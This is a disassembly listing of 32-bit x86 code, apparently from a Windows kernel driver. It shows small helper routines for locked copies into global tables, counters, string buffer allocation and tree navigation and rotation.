   10e81:	lea    eax,[ebp-0x8]
   10e84:	push   eax
   10e85:	lea    eax,[ebp-0x10]
   10e88:	push   eax
   10e89:	call   DWORD PTR ds:0x1ee20
   10e8f:	neg    eax
   10e91:	sbb    eax,eax
   10e93:	inc    eax
   10e94:	jmp    0x10e98
   10e96:	xor    al,al
   10e98:	pop    edi
   10e99:	pop    esi
   10e9a:	leave  
   10e9b:	ret    0x8
   10e9e:	int3   
   10e9f:	int3   
   10ea0:	int3   
   10ea1:	int3   
   10ea2:	int3   
   10ea3:	int3   
   10ea4:	mov    edi,edi
   10ea6:	push   ebp
   10ea7:	mov    ebp,esp
   10ea9:	push   ebx
   10eaa:	xor    eax,eax
   10eac:	push   eax
   10ead:	push   eax
   10eae:	push   eax
   10eaf:	push   eax
   10eb0:	mov    ebx,0x7eb44
   10eb5:	push   ebx
   10eb6:	call   DWORD PTR ds:0x1ee28
   10ebc:	test   eax,eax
   10ebe:	jge    0x10ec4
   10ec0:	xor    al,al
   10ec2:	jmp    0x10ee7
   10ec4:	push   esi
   10ec5:	mov    esi,DWORD PTR [ebp+0x8]
   10ec8:	push   edi
   10ec9:	imul   esi,esi,0x14
   10ecc:	mov    edi,DWORD PTR [ebp+0xc]
   10ecf:	push   0x5
   10ed1:	pop    ecx
   10ed2:	push   0x0
   10ed4:	add    esi,0x7ed94
   10eda:	push   ebx
   10edb:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10edd:	call   DWORD PTR ds:0x1ee24
   10ee3:	pop    edi
   10ee4:	mov    al,0x1
   10ee6:	pop    esi
   10ee7:	pop    ebx
   10ee8:	pop    ebp
   10ee9:	ret    0x8
   10eec:	int3   
   10eed:	int3   
   10eee:	int3   
   10eef:	int3   
   10ef0:	int3   
   10ef1:	int3   
   10ef2:	mov    edi,edi
   10ef4:	push   ebp
   10ef5:	mov    ebp,esp
   10ef7:	push   ebx
   10ef8:	xor    eax,eax
   10efa:	push   eax
   10efb:	push   eax
   10efc:	push   eax
   10efd:	push   eax
   10efe:	mov    ebx,0x7eb44
   10f03:	push   ebx
   10f04:	call   DWORD PTR ds:0x1ee28
   10f0a:	test   eax,eax
   10f0c:	jl     0x10f2f
   10f0e:	push   esi
   10f0f:	mov    esi,DWORD PTR [ebp+0xc]
   10f12:	push   edi
   10f13:	mov    edi,DWORD PTR [ebp+0x8]
   10f16:	imul   edi,edi,0x14
   10f19:	push   0x5
   10f1b:	pop    ecx
   10f1c:	push   0x0
   10f1e:	add    edi,0x7ed94
   10f24:	push   ebx
   10f25:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10f27:	call   DWORD PTR ds:0x1ee24
   10f2d:	pop    edi
   10f2e:	pop    esi
   10f2f:	pop    ebx
   10f30:	pop    ebp
   10f31:	ret    0x8
   10f34:	int3   
   10f35:	int3   
   10f36:	int3   
   10f37:	int3   
   10f38:	int3   
   10f39:	int3   
   10f3a:	mov    edi,edi
   10f3c:	push   ebp
   10f3d:	mov    ebp,esp
   10f3f:	sub    esp,0x14
   10f42:	and    DWORD PTR [ebp-0x14],0x0
   10f46:	push   edi
   10f47:	xor    eax,eax
   10f49:	lea    edi,[ebp-0x10]
   10f4c:	stos   DWORD PTR es:[edi],eax
   10f4d:	stos   DWORD PTR es:[edi],eax
   10f4e:	stos   DWORD PTR es:[edi],eax
   10f4f:	stos   DWORD PTR es:[edi],eax
   10f50:	lea    eax,[ebp-0x14]
   10f53:	push   eax
   10f54:	push   DWORD PTR [ebp+0x8]
   10f57:	call   0x10ef2
   10f5c:	pop    edi
   10f5d:	leave  
   10f5e:	ret    0x4
   10f61:	int3   
   10f62:	int3   
   10f63:	int3   
   10f64:	int3   
   10f65:	int3   
   10f66:	mov    edi,edi
   10f68:	push   ebp
   10f69:	mov    ebp,esp
   10f6b:	push   ebx
   10f6c:	xor    eax,eax
   10f6e:	push   eax
   10f6f:	push   eax
   10f70:	push   eax
   10f71:	push   eax
   10f72:	mov    ebx,0x7ecd0
   10f77:	push   ebx
   10f78:	call   DWORD PTR ds:0x1ee28
   10f7e:	test   eax,eax
   10f80:	jl     0x10f9c
   10f82:	push   esi
   10f83:	mov    esi,DWORD PTR [ebp+0x8]
   10f86:	push   edi
   10f87:	push   0x40
   10f89:	pop    ecx
   10f8a:	push   0x0
   10f8c:	mov    edi,0x7edc0
   10f91:	push   ebx
   10f92:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10f94:	call   DWORD PTR ds:0x1ee24
   10f9a:	pop    edi
   10f9b:	pop    esi
   10f9c:	pop    ebx
   10f9d:	pop    ebp
   10f9e:	ret    0x4
   10fa1:	int3   
   10fa2:	int3   
   10fa3:	int3   
   10fa4:	int3   
   10fa5:	int3   
   10fa6:	mov    edi,edi
   10fa8:	push   ebp
   10fa9:	mov    ebp,esp
   10fab:	push   ebx
   10fac:	xor    eax,eax
   10fae:	push   eax
   10faf:	push   eax
   10fb0:	push   eax
   10fb1:	push   eax
   10fb2:	mov    ebx,0x7ecd0
   10fb7:	push   ebx
   10fb8:	call   DWORD PTR ds:0x1ee28
   10fbe:	test   eax,eax
   10fc0:	jge    0x10fc6
   10fc2:	xor    al,al
   10fc4:	jmp    0x10fec
   10fc6:	push   esi
   10fc7:	push   edi
   10fc8:	mov    edi,DWORD PTR [ebp+0x8]
   10fcb:	push   0x40
   10fcd:	pop    ecx
   10fce:	push   0x0
   10fd0:	mov    esi,0x7edc0
   10fd5:	push   ebx
   10fd6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10fd8:	call   DWORD PTR ds:0x1ee24
   10fde:	xor    eax,eax
   10fe0:	cmp    WORD PTR ds:0x7edc0,ax
   10fe7:	pop    edi
   10fe8:	setne  al
   10feb:	pop    esi
   10fec:	pop    ebx
   10fed:	pop    ebp
   10fee:	ret    0x4
   10ff1:	int3   
   10ff2:	int3   
   10ff3:	int3   
   10ff4:	int3   
   10ff5:	int3   
   10ff6:	mov    edi,edi
   10ff8:	push   ebp
   10ff9:	mov    ebp,esp
   10ffb:	push   ebx
   10ffc:	mov    ebx,DWORD PTR [ebp+0x8]
   10fff:	cmp    ebx,0x40
   11002:	ja     0x1102f
   11004:	push   esi
   11005:	push   edi
   11006:	xor    edi,edi
   11008:	push   edi
   11009:	push   edi
   1100a:	push   edi
   1100b:	push   edi
   1100c:	mov    esi,0x7ed0c
   11011:	push   esi
   11012:	call   DWORD PTR ds:0x1ee28
   11018:	test   eax,eax
   1101a:	jl     0x1102d
   1101c:	push   edi
   1101d:	lea    eax,[ebx*4+0x7ebd0]
   11024:	inc    DWORD PTR [eax]
   11026:	push   esi
   11027:	call   DWORD PTR ds:0x1ee24
   1102d:	pop    edi
   1102e:	pop    esi
   1102f:	pop    ebx
   11030:	pop    ebp
   11031:	ret    0x4
   11034:	int3   
   11035:	int3   
   11036:	int3   
   11037:	int3   
   11038:	int3   
   11039:	int3   
   1103a:	mov    edi,edi
   1103c:	push   ebp
   1103d:	mov    ebp,esp
   1103f:	push   ebx
   11040:	push   esi
   11041:	push   edi
   11042:	mov    edi,DWORD PTR [ebp+0x8]
   11045:	cmp    edi,0x40
   11048:	ja     0x11073
   1104a:	xor    ebx,ebx
   1104c:	push   ebx
   1104d:	push   ebx
   1104e:	push   ebx
   1104f:	push   ebx
   11050:	mov    esi,0x7ed0c
   11055:	push   esi
   11056:	call   DWORD PTR ds:0x1ee28
   1105c:	test   eax,eax
   1105e:	jl     0x11073
   11060:	mov    edi,DWORD PTR [edi*4+0x7ebd0]
   11067:	push   ebx
   11068:	push   esi
   11069:	call   DWORD PTR ds:0x1ee24
   1106f:	mov    eax,edi
   11071:	jmp    0x11075
   11073:	xor    eax,eax
   11075:	pop    edi
   11076:	pop    esi
   11077:	pop    ebx
   11078:	pop    ebp
   11079:	ret    0x4
   1107c:	int3   
   1107d:	int3   
   1107e:	int3   
   1107f:	int3   
   11080:	int3   
   11081:	int3   
   11082:	mov    edi,edi
   11084:	push   ebp
   11085:	mov    ebp,esp
   11087:	push   esi
   11088:	mov    esi,DWORD PTR [ebp+0x8]
   1108b:	push   edi
   1108c:	push   DWORD PTR [esi]
   1108e:	call   0x10a66
   11093:	push   DWORD PTR [esi]
   11095:	mov    edi,eax
   11097:	push   esi
   11098:	push   edi
   11099:	call   0x1daa0
   1109e:	add    esp,0x10
   110a1:	mov    eax,edi
   110a3:	pop    edi
   110a4:	pop    esi
   110a5:	pop    ebp
   110a6:	ret    0x4
   110a9:	int3   
   110aa:	int3   
   110ab:	int3   
   110ac:	int3   
   110ad:	int3   
   110ae:	mov    edi,edi
   110b0:	push   esi
   110b1:	mov    esi,ecx
   110b3:	push   DWORD PTR [esi+0x8]
   110b6:	call   0x10a9a
   110bb:	push   DWORD PTR [esi]
   110bd:	call   0x10a9a
   110c2:	pop    ecx
   110c3:	pop    ecx
   110c4:	pop    esi
   110c5:	ret    
   110c6:	int3   
   110c7:	int3   
   110c8:	int3   
   110c9:	int3   
   110ca:	int3   
   110cb:	int3   
   110cc:	mov    edi,edi
   110ce:	push   ebp
   110cf:	mov    ebp,esp
   110d1:	push   esi
   110d2:	mov    esi,DWORD PTR [ebp+0xc]
   110d5:	push   edi
   110d6:	mov    edi,ecx
   110d8:	cmp    esi,0xffffffff
   110db:	jne    0x110ec
   110dd:	mov    esi,DWORD PTR [ebp+0x8]
   110e0:	lea    ecx,[esi+0x1]
   110e3:	mov    al,BYTE PTR [esi]
   110e5:	inc    esi
   110e6:	test   al,al
   110e8:	jne    0x110e3
   110ea:	sub    esi,ecx
   110ec:	lea    eax,[esi+0x1]
   110ef:	push   eax
   110f0:	call   0x10a66
   110f5:	pop    ecx
   110f6:	mov    DWORD PTR [edi],eax
   110f8:	test   eax,eax
   110fa:	jne    0x11107
   110fc:	push   0xc000009a
   11101:	call   DWORD PTR ds:0x1ee14
   11107:	mov    eax,DWORD PTR [edi]
   11109:	push   esi
   1110a:	push   DWORD PTR [ebp+0x8]
   1110d:	mov    BYTE PTR [esi+eax*1],0x0
   11111:	push   DWORD PTR [edi]
   11113:	call   0x1daa0
   11118:	add    esp,0xc
   1111b:	mov    DWORD PTR [edi+0x4],esi
   1111e:	pop    edi
   1111f:	pop    esi
   11120:	pop    ebp
   11121:	ret    0x8
   11124:	int3   
   11125:	int3   
   11126:	int3   
   11127:	int3   
   11128:	int3   
   11129:	int3   
   1112a:	mov    edi,edi
   1112c:	push   ebp
   1112d:	mov    ebp,esp
   1112f:	mov    eax,DWORD PTR [ebp+0x8]
   11132:	mov    edx,DWORD PTR [ebp+0xc]
   11135:	push   esi
   11136:	xor    esi,esi
   11138:	jmp    0x1115d
   1113a:	mov    ecx,eax
   1113c:	and    ecx,0x1
   1113f:	or     ecx,esi
   11141:	push   esi
   11142:	jne    0x1114f
   11144:	push   0x2
   11146:	push   edx
   11147:	push   eax
   11148:	call   0x1da88
   1114d:	jmp    0x1115d
   1114f:	push   0x3
   11151:	push   edx
   11152:	push   eax
   11153:	call   0x1da7c
   11158:	add    eax,0x1
   1115b:	adc    edx,esi
   1115d:	cmp    eax,0x4
   11160:	jne    0x1113a
   11162:	cmp    edx,esi
   11164:	jne    0x1113a
   11166:	pop    esi
   11167:	pop    ebp
   11168:	ret    0x8
   1116b:	int3   
   1116c:	int3   
   1116d:	int3   
   1116e:	int3   
   1116f:	int3   
   11170:	mov    edi,edi
   11172:	push   ebp
   11173:	mov    ebp,esp
   11175:	push   esi
   11176:	push   edi
   11177:	mov    edi,DWORD PTR [ebp+0xc]
   1117a:	mov    esi,ecx
   1117c:	cmp    edi,0xffffffff
   1117f:	jne    0x1118b
   11181:	push   DWORD PTR [ebp+0x8]
   11184:	call   0x109c0
   11189:	mov    edi,eax
   1118b:	xor    ecx,ecx
   1118d:	push   0x2
   1118f:	pop    edx
   11190:	lea    eax,[edi+0x1]
   11193:	mul    edx
   11195:	seto   cl
   11198:	neg    ecx
   1119a:	or     ecx,eax
   1119c:	push   ecx
   1119d:	call   0x10a66
   111a2:	pop    ecx
   111a3:	mov    DWORD PTR [esi],eax
   111a5:	test   eax,eax
   111a7:	jne    0x111b4
   111a9:	push   0xc000009a
   111ae:	call   DWORD PTR ds:0x1ee14
   111b4:	mov    ecx,DWORD PTR [esi]
   111b6:	lea    eax,[edi+edi*1]
   111b9:	push   eax
   111ba:	push   DWORD PTR [ebp+0x8]
   111bd:	xor    edx,edx
   111bf:	mov    WORD PTR [eax+ecx*1],dx
   111c3:	push   DWORD PTR [esi]
   111c5:	call   0x1daa0
   111ca:	add    esp,0xc
   111cd:	mov    DWORD PTR [esi+0x4],edi
   111d0:	pop    edi
   111d1:	pop    esi
   111d2:	pop    ebp
   111d3:	ret    0x8
   111d6:	int3   
   111d7:	int3   
   111d8:	int3   
   111d9:	int3   
   111da:	int3   
   111db:	int3   
   111dc:	mov    edi,edi
   111de:	push   ebp
   111df:	mov    ebp,esp
   111e1:	mov    eax,DWORD PTR [ebp+0x8]
   111e4:	mov    edx,DWORD PTR ds:0x7f6c8
   111ea:	jmp    0x111ee
   111ec:	mov    eax,ecx
   111ee:	mov    ecx,DWORD PTR [eax+0x8]
   111f1:	cmp    ecx,edx
   111f3:	jne    0x111ec
   111f5:	pop    ebp
   111f6:	ret    0x4
   111f9:	int3   
   111fa:	int3   
   111fb:	int3   
   111fc:	int3   
   111fd:	int3   
   111fe:	mov    edi,edi
   11200:	push   ebp
   11201:	mov    ebp,esp
   11203:	mov    eax,DWORD PTR [ebp+0x8]
   11206:	mov    edx,DWORD PTR ds:0x7f6c8
   1120c:	jmp    0x11210
   1120e:	mov    eax,ecx
   11210:	mov    ecx,DWORD PTR [eax]
   11212:	cmp    ecx,edx
   11214:	jne    0x1120e
   11216:	pop    ebp
   11217:	ret    0x4
   1121a:	int3   
   1121b:	int3   
   1121c:	int3   
   1121d:	int3   
   1121e:	int3   
   1121f:	int3   
   11220:	mov    edi,edi
   11222:	push   ebp
   11223:	mov    ebp,esp
   11225:	mov    eax,DWORD PTR [ebp+0x8]
   11228:	mov    edx,DWORD PTR ds:0x7f6cc
   1122e:	jmp    0x11232
   11230:	mov    eax,ecx
   11232:	mov    ecx,DWORD PTR [eax+0x8]
   11235:	cmp    ecx,edx
   11237:	jne    0x11230
   11239:	pop    ebp
   1123a:	ret    0x4
   1123d:	int3   
   1123e:	int3   
   1123f:	int3   
   11240:	int3   
   11241:	int3   
   11242:	mov    edi,edi
   11244:	push   ebp
   11245:	mov    ebp,esp
   11247:	mov    eax,DWORD PTR [ebp+0x8]
   1124a:	mov    edx,DWORD PTR ds:0x7f6cc
   11250:	jmp    0x11254
   11252:	mov    eax,ecx
   11254:	mov    ecx,DWORD PTR [eax]
   11256:	cmp    ecx,edx
   11258:	jne    0x11252
   1125a:	pop    ebp
   1125b:	ret    0x4
   1125e:	int3   
   1125f:	int3   
   11260:	int3   
   11261:	int3   
   11262:	int3   
   11263:	int3   
   11264:	mov    edi,edi
   11266:	push   ebp
   11267:	mov    ebp,esp
   11269:	mov    eax,DWORD PTR [ebp+0x8]
   1126c:	mov    edx,DWORD PTR ds:0x7f6d0
   11272:	jmp    0x11276
   11274:	mov    eax,ecx
   11276:	mov    ecx,DWORD PTR [eax+0x8]
   11279:	cmp    ecx,edx
   1127b:	jne    0x11274
   1127d:	pop    ebp
   1127e:	ret    0x4
   11281:	int3   
   11282:	int3   
   11283:	int3   
   11284:	int3   
   11285:	int3   
   11286:	mov    edi,edi
   11288:	push   ebp
   11289:	mov    ebp,esp
   1128b:	mov    eax,DWORD PTR [ebp+0x8]
   1128e:	mov    edx,DWORD PTR ds:0x7f6d0
   11294:	jmp    0x11298
   11296:	mov    eax,ecx
   11298:	mov    ecx,DWORD PTR [eax]
   1129a:	cmp    ecx,edx
   1129c:	jne    0x11296
   1129e:	pop    ebp
   1129f:	ret    0x4
   112a2:	int3   
   112a3:	int3   
   112a4:	int3   
   112a5:	int3   
   112a6:	int3   
   112a7:	int3   
   112a8:	mov    edi,edi
   112aa:	push   esi
   112ab:	mov    esi,ecx
   112ad:	mov    ecx,DWORD PTR [esi]
   112af:	cmp    DWORD PTR [ecx+0x14],0x0
   112b3:	jne    0x112c2
   112b5:	mov    eax,DWORD PTR [ecx+0x4]
   112b8:	cmp    DWORD PTR [eax+0x4],ecx
   112bb:	jne    0x112c2
   112bd:	mov    eax,DWORD PTR [ecx+0x8]
   112c0:	jmp    0x112df
   112c2:	mov    eax,DWORD PTR [ecx]
   112c4:	cmp    eax,DWORD PTR ds:0x7f6c8
   112ca:	je     0x112d8
   112cc:	push   eax
   112cd:	call   0x111dc
   112d2:	jmp    0x112df
   112d4:	mov    DWORD PTR [esi],eax
   112d6:	mov    ecx,eax
   112d8:	mov    eax,DWORD PTR [ecx+0x4]
   112db:	cmp    ecx,DWORD PTR [eax]
   112dd:	je     0x112d4
   112df:	mov    DWORD PTR [esi],eax
   112e1:	pop    esi
   112e2:	ret    
   112e3:	int3   
   112e4:	int3   
   112e5:	int3   
   112e6:	int3   
   112e7:	int3   
   112e8:	mov    edi,edi
   112ea:	push   esi
   112eb:	mov    esi,ecx
   112ed:	mov    ecx,DWORD PTR [esi]
   112ef:	mov    eax,DWORD PTR [ecx+0x8]
   112f2:	cmp    eax,DWORD PTR ds:0x7f6c8
   112f8:	je     0x11306
   112fa:	push   eax
   112fb:	call   0x111fe
   11300:	jmp    0x11315
   11302:	mov    DWORD PTR [esi],eax
   11304:	mov    ecx,eax
   11306:	mov    eax,DWORD PTR [ecx+0x4]
   11309:	cmp    ecx,DWORD PTR [eax+0x8]
   1130c:	je     0x11302
   1130e:	mov    ecx,DWORD PTR [esi]
   11310:	cmp    DWORD PTR [ecx+0x8],eax
   11313:	je     0x11317
   11315:	mov    DWORD PTR [esi],eax
   11317:	pop    esi
   11318:	ret    
   11319:	int3   
   1131a:	int3   
   1131b:	int3   
   1131c:	int3   
   1131d:	int3   
   1131e:	mov    edi,edi
   11320:	push   ebp
   11321:	mov    ebp,esp
   11323:	mov    edx,DWORD PTR [ebp+0x8]
   11326:	mov    eax,DWORD PTR [edx+0x8]
   11329:	push   esi
   1132a:	mov    esi,DWORD PTR [eax]
   1132c:	mov    DWORD PTR [edx+0x8],esi
   1132f:	mov    esi,DWORD PTR [eax]
   11331:	cmp    esi,DWORD PTR ds:0x7f6d4
   11337:	je     0x1133c
   11339:	mov    DWORD PTR [esi+0x4],edx
   1133c:	mov    esi,DWORD PTR [edx+0x4]
   1133f:	mov    DWORD PTR [eax+0x4],esi
   11342:	mov    ecx,DWORD PTR [ecx+0x4]
   11345:	pop    esi
   11346:	cmp    edx,DWORD PTR [ecx+0x4]
   11349:	jne    0x11350
   1134b:	mov    DWORD PTR [ecx+0x4],eax
   1134e:	jmp    0x1135e
   11350:	mov    ecx,DWORD PTR [edx+0x4]
   11353:	cmp    edx,DWORD PTR [ecx]
   11355:	jne    0x1135b
   11357:	mov    DWORD PTR [ecx],eax
   11359:	jmp    0x1135e
   1135b:	mov    DWORD PTR [ecx+0x8],eax
   1135e:	mov    DWORD PTR [eax],edx
   11360:	mov    DWORD PTR [edx+0x4],eax
   11363:	pop    ebp
   11364:	ret    0x4
   11367:	int3   
   11368:	int3   
   11369:	int3   
   1136a:	int3   
   1136b:	int3   
   1136c:	mov    edi,edi
   1136e:	push   ebp
   1136f:	mov    ebp,esp
   11371:	mov    eax,DWORD PTR [ebp+0x8]
   11374:	mov    edx,DWORD PTR ds:0x7f6d4
   1137a:	jmp    0x1137e
   1137c:	mov    eax,ecx
   1137e:	mov    ecx,DWORD PTR [eax+0x8]
   11381:	cmp    ecx,edx
   11383:	jne    0x1137c
   11385:	pop    ebp
   11386:	ret    0x4
   11389:	int3   
   1138a:	int3   
   1138b:	int3   
   1138c:	int3   
   1138d:	int3   
   1138e:	mov    edi,edi
   11390:	push   ebp
   11391:	mov    ebp,esp
   11393:	mov    edx,DWORD PTR [ebp+0x8]
   11396:	mov    eax,DWORD PTR [edx]
   11398:	push   esi
   11399:	mov    esi,DWORD PTR [eax+0x8]
   1139c:	mov    DWORD PTR [edx],esi
   1139e:	mov    esi,DWORD PTR [eax+0x8]
   113a1:	cmp    esi,DWORD PTR ds:0x7f6d4
   113a7:	je     0x113ac
   113a9:	mov    DWORD PTR [esi+0x4],edx
   113ac:	mov    esi,DWORD PTR [edx+0x4]
   113af:	mov    DWORD PTR [eax+0x4],esi
   113b2:	mov    ecx,DWORD PTR [ecx+0x4]
   113b5:	pop    esi
   113b6:	cmp    edx,DWORD PTR [ecx+0x4]
   113b9:	jne    0x113c0
   113bb:	mov    DWORD PTR [ecx+0x4],eax
   113be:	jmp    0x113cf
   113c0:	mov    ecx,DWORD PTR [edx+0x4]
   113c3:	cmp    edx,DWORD PTR [ecx+0x8]
   113c6:	jne    0x113cd
   113c8:	mov    DWORD PTR [ecx+0x8],eax
   113cb:	jmp    0x113cf
   113cd:	mov    DWORD PTR [ecx],eax
   113cf:	mov    DWORD PTR [eax+0x8],edx
   113d2:	mov    DWORD PTR [edx+0x4],eax
   113d5:	pop    ebp
   113d6:	ret    0x4
   113d9:	int3   
   113da:	int3   
   113db:	int3   
   113dc:	int3   
   113dd:	int3   
   113de:	mov    edi,edi
   113e0:	push   esi
   113e1:	mov    esi,ecx
   113e3:	mov    ecx,DWORD PTR [esi]
   113e5:	cmp    DWORD PTR [ecx+0x68],0x0
   113e9:	jne    0x113f8
   113eb:	mov    eax,DWORD PTR [ecx+0x4]
   113ee:	cmp    DWORD PTR [eax+0x4],ecx
   113f1:	jne    0x113f8
   113f3:	mov    eax,DWORD PTR [ecx+0x8]
   113f6:	jmp    0x11415
   113f8:	mov    eax,DWORD PTR [ecx]
   113fa:	cmp    eax,DWORD PTR ds:0x7f6d4
   11400:	je     0x1140e
   11402:	push   eax
   11403:	call   0x1136c
   11408:	jmp    0x11415
   1140a:	mov    DWORD PTR [esi],eax
   1140c:	mov    ecx,eax
   1140e:	mov    eax,DWORD PTR [ecx+0x4]
   11411:	cmp    ecx,DWORD PTR [eax]
   11413:	je     0x1140a
   11415:	mov    DWORD PTR [esi],eax
   11417:	pop    esi
   11418:	ret    
   11419:	int3   
   1141a:	int3   
   1141b:	int3   
   1141c:	int3   
   1141d:	int3   
   1141e:	mov    edi,edi
   11420:	push   ebp
   11421:	mov    ebp,esp
   11423:	mov    eax,DWORD PTR [ebp+0x8]
   11426:	mov    edx,DWORD PTR ds:0x7f6d8
   1142c:	jmp    0x11430
   1142e:	mov    eax,ecx
   11430:	mov    ecx,DWORD PTR [eax+0x8]
   11433:	cmp    ecx,edx
   11435:	jne    0x1142e
   11437:	pop    ebp
   11438:	ret    0x4
   1143b:	int3   
   1143c:	int3   
   1143d:	int3   
   1143e:	int3   
   1143f:	int3   
   11440:	mov    edi,edi
   11442:	push   ebp
   11443:	mov    ebp,esp
   11445:	mov    eax,DWORD PTR [ebp+0x8]
   11448:	mov    edx,DWORD PTR ds:0x7f6d8
   1144e:	jmp    0x11452
   11450:	mov    eax,ecx
   11452:	mov    ecx,DWORD PTR [eax]
   11454:	cmp    ecx,edx
   11456:	jne    0x11450
   11458:	pop    ebp
   11459:	ret    0x4
   1145c:	int3   
   1145d:	int3   
   1145e:	int3   
   1145f:	int3   
   11460:	int3   
   11461:	int3   
   11462:	mov    edi,edi
   11464:	push   esi
   11465:	mov    esi,ecx
   11467:	mov    ecx,DWORD PTR [esi]
   11469:	cmp    DWORD PTR [ecx+0x1c],0x0
   1146d:	jne    0x1147c
   1146f:	mov    eax,DWORD PTR [ecx+0x4]
   11472:	cmp    DWORD PTR [eax+0x4],ecx
   11475:	jne    0x1147c
   11477:	mov    eax,DWORD PTR [ecx+0x8]
   1147a:	jmp    0x11499
   1147c:	mov    eax,DWORD PTR [ecx]
   1147e:	cmp    eax,DWORD PTR ds:0x7f6d8
   11484:	je     0x11492
   11486:	push   eax
   11487:	call   0x1141e
   1148c:	jmp    0x11499
   1148e:	mov    DWORD PTR [esi],eax
   11490:	mov    ecx,eax
   11492:	mov    eax,DWORD PTR [ecx+0x4]
   11495:	cmp    ecx,DWORD PTR [eax]
   11497:	je     0x1148e
   11499:	mov    DWORD PTR [esi],eax
   1149b:	pop    esi
   1149c:	ret    
   1149d:	int3   
   1149e:	int3   
   1149f:	int3   
   114a0:	int3   
   114a1:	int3   
   114a2:	mov    edi,edi
   114a4:	push   ebp
   114a5:	mov    ebp,esp
   114a7:	mov    eax,DWORD PTR [ebp+0x8]
   114aa:	mov    edx,DWORD PTR ds:0x7f6dc
   114b0:	jmp    0x114b4
   114b2:	mov    eax,ecx
   114b4:	mov    ecx,DWORD PTR [eax+0x8]
   114b7:	cmp    ecx,edx
   114b9:	jne    0x114b2
   114bb:	pop    ebp
   114bc:	ret    0x4
   114bf:	int3   
   114c0:	int3   
   114c1:	int3   
   114c2:	int3   
   114c3:	int3   
   114c4:	mov    edi,edi
   114c6:	push   ebp
   114c7:	mov    ebp,esp
   114c9:	mov    eax,DWORD PTR [ebp+0x8]
   114cc:	mov    edx,DWORD PTR ds:0x7f6dc
   114d2:	jmp    0x114d6
   114d4:	mov    eax,ecx
   114d6:	mov    ecx,DWORD PTR [eax]
   114d8:	cmp    ecx,edx
   114da:	jne    0x114d4
   114dc:	pop    ebp
   114dd:	ret    0x4
   114e0:	int3   
   114e1:	int3   
   114e2:	int3   
   114e3:	int3   
   114e4:	int3   
   114e5:	int3   
   114e6:	mov    edi,edi
   114e8:	push   esi
   114e9:	mov    esi,ecx
   114eb:	mov    ecx,DWORD PTR [esi]
   114ed:	cmp    DWORD PTR [ecx+0x14],0x0
   114f1:	jne    0x11500
   114f3:	mov    eax,DWORD PTR [ecx+0x4]
   114f6:	cmp    DWORD PTR [eax+0x4],ecx
   114f9:	jne    0x11500
   114fb:	mov    eax,DWORD PTR [ecx+0x8]
   114fe:	jmp    0x1151d
   11500:	mov    eax,DWORD PTR [ecx]
   11502:	cmp    eax,DWORD PTR ds:0x7f6dc
   11508:	je     0x11516
   1150a:	push   eax
   1150b:	call   0x114a2
   11510:	jmp    0x1151d
   11512:	mov    DWORD PTR [esi],eax
   11514:	mov    ecx,eax
   11516:	mov    eax,DWORD PTR [ecx+0x4]
   11519:	cmp    ecx,DWORD PTR [eax]
   1151b:	je     0x11512
   1151d:	mov    DWORD PTR [esi],eax
   1151f:	pop    esi
   11520:	ret    
   11521:	int3   
   11522:	int3   
   11523:	int3   
   11524:	int3   
   11525:	int3   
   11526:	mov    edi,edi
   11528:	push   esi
   11529:	mov    esi,ecx
   1152b:	mov    ecx,DWORD PTR [esi]
   1152d:	cmp    DWORD PTR [ecx+0x70],0x0
   11531:	jne    0x11540
   11533:	mov    eax,DWORD PTR [ecx+0x4]
   11536:	cmp    DWORD PTR [eax+0x4],ecx
   11539:	jne    0x11540
   1153b:	mov    eax,DWORD PTR [ecx+0x8]
   1153e:	jmp    0x1155d
   11540:	mov    eax,DWORD PTR [ecx]
   11542:	cmp    eax,DWORD PTR ds:0x7f6d0
   11548:	je     0x11556
   1154a:	push   eax
   1154b:	call   0x11264
   11550:	jmp    0x1155d
   11552:	mov    DWORD PTR [esi],eax
   11554:	mov    ecx,eax
   11556:	mov    eax,DWORD PTR [ecx+0x4]
   11559:	cmp    ecx,DWORD PTR [eax]
   1155b:	je     0x11552
   1155d:	mov    DWORD PTR [esi],eax
   1155f:	pop    esi
   11560:	ret    
   11561:	int3   
   11562:	int3   
   11563:	int3   
   11564:	int3   
   11565:	int3   
   11566:	mov    edi,edi
   11568:	push   esi
   11569:	mov    esi,ecx
   1156b:	mov    ecx,DWORD PTR [esi]
   1156d:	mov    eax,DWORD PTR [ecx+0x8]
   11570:	cmp    eax,DWORD PTR ds:0x7f6d8
   11576:	je     0x11584
   11578:	push   eax
   11579:	call   0x11440
   1157e:	jmp    0x11593
   11580:	mov    DWORD PTR [esi],eax
   11582:	mov    ecx,eax
   11584:	mov    eax,DWORD PTR [ecx+0x4]
   11587:	cmp    ecx,DWORD PTR [eax+0x8]
   1158a:	je     0x11580
   1158c:	mov    ecx,DWORD PTR [esi]
   1158e:	cmp    DWORD PTR [ecx+0x8],eax
   11591:	je     0x11595
   11593:	mov    DWORD PTR [esi],eax
   11595:	pop    esi
   11596:	ret    
   11597:	int3   
   11598:	int3   
   11599:	int3   
   1159a:	int3   
   1159b:	int3   
   1159c:	mov    edi,edi
   1159e:	push   esi
   1159f:	mov    esi,ecx
   115a1:	mov    ecx,DWORD PTR [esi]
   115a3:	mov    eax,DWORD PTR [ecx+0x8]
   115a6:	cmp    eax,DWORD PTR ds:0x7f6dc
   115ac:	je     0x115ba
   115ae:	push   eax
   115af:	call   0x114c4
   115b4:	jmp    0x115c9
   115b6:	mov    DWORD PTR [esi],eax
   115b8:	mov    ecx,eax
   115ba:	mov    eax,DWORD PTR [ecx+0x4]
   115bd:	cmp    ecx,DWORD PTR [eax+0x8]
   115c0:	je     0x115b6
   115c2:	mov    ecx,DWORD PTR [esi]
   115c4:	cmp    DWORD PTR [ecx+0x8],eax
   115c7:	je     0x115cb
   115c9:	mov    DWORD PTR [esi],eax
   115cb:	pop    esi
   115cc:	ret    
   115cd:	int3   
   115ce:	int3   
   115cf:	int3   
   115d0:	int3   
   115d1:	int3   
   115d2:	mov    edi,edi
   115d4:	push   ebp
   115d5:	mov    ebp,esp
   115d7:	mov    eax,DWORD PTR [ebp+0x8]
   115da:	mov    edx,DWORD PTR ds:0x7f6e4
   115e0:	jmp    0x115e4
   115e2:	mov    eax,ecx
   115e4:	mov    ecx,DWORD PTR [eax+0x8]
   115e7:	cmp    ecx,edx
   115e9:	jne    0x115e2
   115eb:	pop    ebp
   115ec:	ret    0x4
   115ef:	int3   
   115f0:	int3   
   115f1:	int3   
   115f2:	int3   
